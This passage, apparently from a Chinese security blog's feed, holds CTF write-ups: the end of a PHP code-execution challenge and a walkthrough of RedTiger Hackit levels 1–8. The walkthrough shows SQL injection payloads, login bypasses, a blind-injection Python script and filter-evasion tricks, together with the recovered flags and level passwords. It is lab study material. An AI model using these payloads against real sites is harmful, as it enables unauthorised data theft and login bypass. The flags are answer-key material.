<p>以上最难理解的就是 <code>localeconv()</code>，但是这又是最关键的，因为不能传入参数，所以得想方设法找到路径 <code>/</code> 和 <code>.</code> ，而该函数就能够找到后者。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200955.png" /></p>
<p>注意上图中的箭头处，那是 <code>.</code> 。因此，我们只要将它取出来即可，这时候就需要用到<code>current()</code> 了。然后再配合上 <code>scandir()</code> 和 <code>print_r</code> 就可以得到当前目录下的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
<p>返回结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201026.png" /></p>
<p>注意到 <code>flag.php</code> 在第4个，或者说是倒数第2个。此时有两种方法：</p>
<p>第一种，将整个数组反转，然后用 next() 取反转后的第二个元素，即 flag.php。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201059.png" /></p>
<p>第二种比较看运气，利用 <code>array_flip()</code> 将交换数组的键和值</p>
<p><code>?exp=print_r(array_flip(scandir(current(localeconv()))));</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201121.png" /></p>
<p>然后利用 <code>array_rand(array_flip())</code> 将数组的键<strong>随机</strong>的读取</p>
<p><code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201131.png" /></p>
<p>最终的 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>由于随机性，所以需要多刷新几次。</p>
<h1 id="总结">总结</h1>
<p>由于对 PHP 代码的不熟悉，导致本题最多只能做到代码审计这一步。得挑个时候学学 PHP 了，跑不掉的呀。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>PHP</tag>
        <tag>git泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>Redtiger_Hackit_WriteUp</title>
    <url>/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/</url>
    <content><![CDATA[<p>网站：https://redtiger.labs.overthewire.org/</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161838.png" /></p>
<span id="more"></span>
<h1 id="level-1">Level-1</h1>
<h2 id="题目描述">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152754.png" /></p>
<p>点击 <code>1</code> 发现 url 出现 <code>cat=1</code> ，并且页面出现了一些变化 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152853.png" /></p>
<p>url: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level1.php?cat=1</span><br></pre></td></tr></table></figure></p>
<h2 id="测试注入点">测试注入点</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cat=1=1</span><br><span class="line">?cat=1=2</span><br></pre></td></tr></table></figure>
<p>如上 payload，后者出现 <code>This category does not exist!</code>，而前者正常，说明存在注入点，并且为数字型，即没有闭合方式。</p>
<h2 id="注入过程">注入过程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 测试多少列：?cat=1 order by 4</span><br><span class="line">2. 测试显示位：?cat=-1 union select 1,2,3,4</span><br><span class="line">3. 测得数据库为hackit：?cat=-1 union select 1,2,3,database()</span><br></pre></td></tr></table></figure>
<p>如果按照常规的显示表、列会出现 <code>Some things are disabled!!!</code> 也就是被过滤了。但是考虑到表名给我们了，并且根据描述，可以猜测表内有<code>username, password</code> 两个字段。因此构造如下paylaod： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cat=-1 union select 1,2,username,password from level1_users</span><br></pre></td></tr></table></figure></p>
<p>得到用户名为：Hornoxe，密码为：thatwaseasy。成功登录： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 27cbddc803ecde822d87a7e8639f9315  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: passwords_will_change_over_time_let_us_do_a_shitty_rhyme</span><br></pre></td></tr></table></figure></p>
<p>可以到wechall上提交flag，网址：https://www.wechall.net/14-levels-on-Hackit.html</p>
<h1 id="level-2">Level-2</h1>
<h2 id="题目描述-1">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318153929.png" /></p>
<p>根据描述，这道题是登录绕过。</p>
<h2 id="测试注入点-1">测试注入点</h2>
<p>分别对username和password测试，结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;&amp;password=123&amp;login=Login</span><br></pre></td></tr></table></figure> 对应：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154813.png" /></p>
<p>而 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>对应： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154617.png" /></p>
<p>因此注入点应该在password。</p>
<p>并且 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>则不出现报错信息，只出现 <code>login incorrect!</code>。这就更加确定password为注入点。</p>
<h2 id="注入过程-1">注入过程</h2>
<p>本题为登录绕过，因此尝试万能密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27; or 1=1#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>发现成功登录： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154759.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 1222e2d4ad5da677efb188550528bfaa  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: feed_the_cat_who_eats_your_bread</span><br></pre></td></tr></table></figure>
<h1 id="level-3">Level-3</h1>
<h2 id="题目描述-2">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154944.png" /></p>
<p>本题很有难度，注意提示 <code>try to get an error</code>。点击 <code>TheCow</code> 和 <code>Admin</code> url会出现 <code>usr</code> 参数，但是不乱是 <code>1=1</code> 还是 <code>1=2</code> 或者加单引号都不起作用，并且将原来的usr经过base64解码后得到的也只是一串数字，跟TheCow和Admin无法对上。查看大佬的writeup之后发现，需要<strong>传入数组让它报错</strong>！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318155401.png" /></p>
<p>注意 <code>/var/www/html/hackit/urlcrypt.inc</code> ，这是一个文件，输入网址：<code>http://redtiger.labs.overthewire.org/urlcrypt.inc</code> 并且查看源码得到如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// warning! ugly code ahead :)</span></span><br><span class="line">	<span class="comment">// requires php5.x, sorry for that</span></span><br><span class="line">  		</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$cryptedstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> =<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$temp</span> = ord(substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">1</span>)) ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">while</span>(strlen(<span class="variable">$temp</span>)&lt;<span class="number">3</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$temp</span> = <span class="string">&quot;0&quot;</span>.<span class="variable">$temp</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>. <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> base64_encode(<span class="variable">$cryptedstr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">decrypt</span> (<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%&#x27;</span>,<span class="variable">$str</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$str</span> = base64_decode(<span class="variable">$str</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">null</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$decStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>+=<span class="number">3</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$array</span>[<span class="variable">$i</span>/<span class="number">3</span>] = substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">3</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$s</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$a</span> = <span class="variable">$s</span> ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">					<span class="variable">$decStr</span> .= chr(<span class="variable">$a</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>注意前面的提示，代码只能运行在PHP5.x 版本，太高或者太低的版本会导致最终的加密结果不对！！！</p>
<h2 id="测试注入点-2">测试注入点</h2>
<p>推荐网址，可以选择php版本：http://www.dooccn.com/php5.5/</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160027.png" /></p>
<p>将点击Admin之后得到的usr的值代入解密发现结果正好是Admin，因此得出结论，usr就是注入点，并且需要将payload经过加密后再传入。将 <code>Admin'</code> 加密后传入，发现报错，而 <code>Admin'#</code> 加密后传入正常显示。因此闭合方式为单引号。</p>
<h2 id="注入过程-2">注入过程</h2>
<p>首先，表名已经给了，为：<code>level3_users</code>，需要获得Admin的密码，猜测字段名为：<code>password</code>。（这个网站的字段名都比较正常）因此构造payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：?usr=Admin&#x27; order by 7#  </span><br><span class="line">加密后：MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试显示位：?usr=&#x27; union select 1,2,3,4,5,6,7# </span><br><span class="line">加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMjAzMTY2</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160839.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">得到密码：?usr=&#x27; union select 1,2,3,4,5,6,password from level3_users wehre username=&#x27;admin&#x27;# </span><br><span class="line">加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMTQwMjI4MDYzMTk4MTM1MTA3MTA2MTgwMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTU4MjIwMDcxMDQwMjIwMjA5MDMz</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161210.png" /></p>
<p>注意登录的时候，Username为admin，不要大写。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: a707b245a60d570d25a0449c2a516eca</span><br><span class="line"></span><br><span class="line">The password for the next level is: put_the_kitten_on_your_head</span><br></pre></td></tr></table></figure>
<h1 id="level-4">Level-4</h1>
<h2 id="题目描述-3">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161335.png" /></p>
<p>发现给出了表名为：level4_secret， 字段名为：keyword，并且过滤了 like。</p>
<p>点击 <code>Click me</code>，url出现id=1。</p>
<h2 id="测试注入点-3">测试注入点</h2>
<p>分别用 <code>?id=1=1</code> 和 <code>?id=1=2</code> 测试，分别对应如下的结果：</p>
<ul>
<li>前者提示为：<code>Query returned 1 rows.</code></li>
<li>后者提示为：<code>Query returned 0 rows.</code></li>
</ul>
<p>因此为数字型的注入点。</p>
<h2 id="注入过程-3">注入过程</h2>
<p>注意本题是盲注。并且如果判断错误将会出现提示<code>Query returned 0 rows.</code>，而判断正确则会出现<code>Query returned 1 rows.</code>或者<code>Query returned 2 rows.</code>。因此根据错误的提示不同可以先测试以下word的长度为多少。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and length((select keyword from level4_secret limit 0,1))=21</span><br></pre></td></tr></table></figure></p>
<p>不断修改后面的值，发现长度为21，因此编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time  </span><br><span class="line">  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">url = <span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php&#x27;</span>  </span><br><span class="line">header = &#123;  </span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">payload = <span class="string">&#x27;1 and ascii(substr((select keyword from level4_secret limit 0,1),%d,1))=%d&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">22</span>):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):  </span><br><span class="line">        param = &#123;  </span><br><span class="line">            <span class="string">&quot;id&quot;</span>: payload % (i, j)  </span><br><span class="line">        &#125;  </span><br><span class="line">        r = requests.get(url, params=param, headers=header)  </span><br><span class="line">        time.sleep(<span class="number">0.2</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Query returned 0 rows&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line"> flag += <span class="built_in">chr</span>(j)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure> （本题需要注意，每次通过都会给一个<code>The password for the next level is:xxx</code> 这是用来登录的，会保存在cookie中，所以要在脚本中添加cookie，否则无法访问。可以抓包查看cookie）</p>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">killstickswithbr1cks!</span><br></pre></td></tr></table></figure></p>
<p>成功注入。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa</span><br><span class="line"></span><br><span class="line">The password for the next level is: this_hack_it&#x27;s_old</span><br></pre></td></tr></table></figure></p>
<h1 id="level-5">Level-5</h1>
<h2 id="题目描述-4">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318165905.png" /></p>
<p>本题也是登录绕过，并且存在过滤，而且密码是经过md5加密的。</p>
<h2 id="测试注入点-4">测试注入点</h2>
<p>分别使用： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. username=1&#x27;&amp;password=1&amp;login=Login</span><br><span class="line">2. username=1&#x27;#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>发现前者出现： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_num_rows() expects parameter 1 to be resource, boolean given in &lt;b&gt;/var/www/html/hackit/level5.php</span><br></pre></td></tr></table></figure></p>
<p>而后者没有，说明 username为注入点，并且闭合方式为单引号。</p>
<h2 id="注入过程-4">注入过程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：username=1&#x27; order by 2#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure>
<p>本题是登录绕过，所以优先尝试 <code>1' or 1=1#</code> 发现无法登录。又因为字段数为2，因此做一个猜测（这很重要，很多情况都需要猜测）：</p>
<blockquote>
<p>这两个字段一个是username，另一个是password。根据输入的username，去数据库查询是否存在该用户，如果存在该用户则返回username和password，然后将返回的password和输入的password进行对比，如果一样则登录成功，否则登陆失败。</p>
</blockquote>
<p>根据这猜测，那么我们随便查询一个不存在的用户，这样子就没有返回的结果。然后联合查询，密码字段为<code>md5(number)</code>，这样子就会返回一个结果，其中密码字段为 <code>md5(number)</code> 。如果输入的password为 <code>number</code> ，则md5加密后会与返回结果中的密码一致，从而登陆成功。所以构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; union select 1,md5(1)#&amp;password=1&amp;login=Login</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">username: 1&#x27; union select 1,md5(1)#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure></p>
<p>需要注意两点： 1. 上面所述的 number 要一样； 2. 要得到password所在的位置，要么第一个，要么第二个，尝试两次就出来了；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: the_stone_is_cold</span><br></pre></td></tr></table></figure>
<h1 id="level-6">Level-6 ⭐</h1>
<h2 id="题目描述-5">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318171918.png" /></p>
<p>点击 <code>Click me</code> 发现url出现变化，多了一个 <code>user</code> 参数。</p>
<h2 id="测试注入点-5">测试注入点</h2>
<p>分别使用 <code>?user=1=1</code> 和 <code>?user=1=2</code> 进行测试，发现前者出现报错，而后者没有报错，因此user为数字型注入点。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172316.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172325.png" /></p>
<h2 id="注入过程-5">注入过程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：?user=1 order by 5</span><br></pre></td></tr></table></figure>
<p>字段数为5。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试显示位：?user=-1 union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></p>
<p>得到一个很奇怪的结果：<code>User not found</code>，也就是没有显示位，只是返回了user=-1的查询结果。如下payload的结果也是一样： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1 union select 1,2,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
<p>接下来就是随便的一些尝试，分别将 <code>admin</code>, <code>deddlef</code>, <code>username</code>,<code>password</code> 四个关键词分别带入五个位置，基本都是提示： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318191919.png" /></p>
<p>只有下面的payload有所不同： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1 union select 1,username,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318192043.png" /></p>
<h3 id="思路">思路 ⭐</h3>
<p>出现了新的显示。看了大佬的writeup，得到如下思路：</p>
<p>后台进行了二次查询，首先检查 user 参数，如果查询的 user 存在的话，则会返回结果，这个结果有5列，即5个字段。然后再将结果中的第二个字段进行查询，此时得到的结果才会最终显示出来，即上图中的 username和email。因此，真正的注入点是第二个字段。 解释： <code>user=-1 union select 1,2,3,4,5</code> 返回的结果如下：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">字段1</th>
<th style="text-align: center;">字段2</th>
<th style="text-align: center;">字段3</th>
<th style="text-align: center;">字段4</th>
<th style="text-align: center;">字段5</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">2</td>
<td style="text-align: center;">3</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">5</td>
</tr>
</tbody>
</table>
<p>而<code>user=-1 union select 1,username,3,4,5</code> 返回的结果如下：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">字段1</th>
<th style="text-align: center;">字段2</th>
<th style="text-align: center;">字段3</th>
<th style="text-align: center;">字段4</th>
<th style="text-align: center;">字段5</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">username</td>
<td style="text-align: center;">3</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">5</td>
</tr>
</tbody>
</table>
<p>此时字段2即为注入点，如果直接输入 admin，则会返回admin的信息。</p>
<h3 id="过程">过程</h3>
<p>所以对第二个字段进行注入，根据得到的结果，第二个字段应该是username，然后利用username进行第二次查询数据库，得到信息。</p>
<p>发现admin、(、)等都被过滤了，那么只好将字符串转为16进制尝试。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1%20union%20select%201,admin&#x27;,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e2723,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line"></span><br><span class="line">?user=-1%20union%20select%201,admin,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e27,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure></p>
<p>发现前者出现报错，而后者没有报错。说明确实在第二个字段处存在注入，接下来就是常规的注入过程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 测试字段数：</span><br><span class="line">?user=-1%20union%20select%201,admin&#x27; order by 5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x61646d696e27206f72646572206279203523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>发现显示字段还是5个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2. 测试显示位：</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,2,3,4,5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>结果如下： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194025.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3. 显示用户名和密码</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,username,3,password,5 from level6_users where status=1#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>成功得到用户名和密码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194406.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932</span><br><span class="line"></span><br><span class="line">The password for the next level is: shitcoins_are_hold</span><br></pre></td></tr></table></figure>
<h1 id="level-7">Level-7</h1>
<h2 id="题目描述-6">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195333.png" /></p>
<p>题目要求：查询关于google的信息的作者，输入google发现得到一篇文章，但是没有作者。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195818.png" /></p>
<h2 id="测试注入点-6">测试注入点</h2>
<p>输入 <code>google'</code> 发现报错信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)&#x27; at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%google&#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)</span><br><span class="line"></span><br><span class="line">因此，完整的查询语句如下：SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%输入%&#x27; OR text.title LIKE &#x27;%输入%&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>但是 <code>#</code> 、<code>空格</code> 、<code>--+</code> 都被过滤了。但是可以用 <code>%09</code> 和 <code>%a0</code> 代替，不过注意一定要在burpsuite中，不要直接在输入框中输入，否则%号会被再次url编码。其中 <code>%09</code> 为制表符，后者不太懂。</p>
<p>因此： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=google%&#x27;)--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203348.png" /></p>
<h2 id="注入过程-6">注入过程</h2>
<p>获取显示位： 发现 order by被过滤，不论是大小写、注释都不行。那么直接使用联合查询，如果位数不对也会报错 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,4--%a0&amp;dosearch=search%21 -&gt; 四个字段</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203641.png" /></p>
<p>获取作者名字： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,autor from level7_news--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203840.png" /></p>
<p>猜测应该是 <code>TestUserforg00gle</code>，成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 970cecc0355ed85306588a1a01db4d80</span><br><span class="line"></span><br><span class="line">The password for the next level is: or_so_i&#x27;m_told</span><br></pre></td></tr></table></figure>
<h1 id="level-8">Level-8</h1>
<h2 id="题目描述-7">题目描述 ⭐</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318204016.png" /></p>
<p>这道题给出的是关于 admin 的信息，还有编辑的按钮。猜测本题应该是关于数据更新的注入，即 <code>update</code> ，前面都是 <code>select</code> 的。</p>
<p><code>update</code> 的语句如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=value2,... where column_name3=value;</span><br><span class="line"></span><br><span class="line">前面的column_name是要修改的字段，如果是字符串，则value需要加引号。后面的column_name3是用来找到需要修改的信息。</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=column_name4,... where column_name3=value;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318210614.png" /></p>
